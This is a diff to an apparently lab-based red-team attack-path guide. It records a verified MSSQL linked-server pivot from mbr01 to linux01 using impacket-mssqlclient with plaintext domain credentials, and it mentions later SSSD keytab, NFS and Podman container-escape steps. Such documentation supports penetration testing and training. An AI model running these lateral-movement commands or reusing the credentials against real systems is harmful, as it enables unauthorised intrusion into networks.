@@ -12,6 +12,7 @@
 
 ### Branch D: Linux Pivot
 
+> **Verification note (2026-07-29):** MSSQL linked-server pivot from `mbr01` to `linux01` is verified. `impacket-mssqlclient` as `child\analyst_t1` / `T13r_An@lyst!` connected to `mbr01.child.cadre.local`, and the query `EXECUTE('SELECT name FROM LINUX01.master.sys.databases')` returned linux01 databases. This confirms the Branch D entry point; subsequent SSSD ticket/keytab/NFS/Podman steps were not exercised in this run.
 
 **Diverges from:** Phase 3 (MSSQL linked-server recon discovers linux01).  
 **Converges to:** Phase 6 (domain credentials from linux01 help accelerate child DA).  
@@ -20,10 +21,14 @@
 
 #### Entry: MSSQL Linked Server Recon (WT044)
 
+Verified live (2026-07-29). Use the single-line `-query` flag; do **not** use a multi-line `<<EOF` heredoc — `impacket-mssqlclient` treats the terminator as a stored procedure name and loops.
+
 ```bash
 impacket-mssqlclient child.cadre.local/analyst_t1:'T13r_An@lyst!'@192.168.77.22 \
-  -windows-auth -query "SELECT * FROM OPENQUERY(\"LINUX01\", 'SELECT name FROM sys.databases')"
+  -windows-auth -query "SELECT name FROM LINUX01.master.sys.databases"
 ```
+
+For scripted automation, prefer a Python `pymssql` wrapper or the PowerShell `System.Data.SqlClient` path used in `T040-mssql-linked-server-hop-ws01.sh`.
 
 #### Entry: Podman Container Escape (WT048)
 
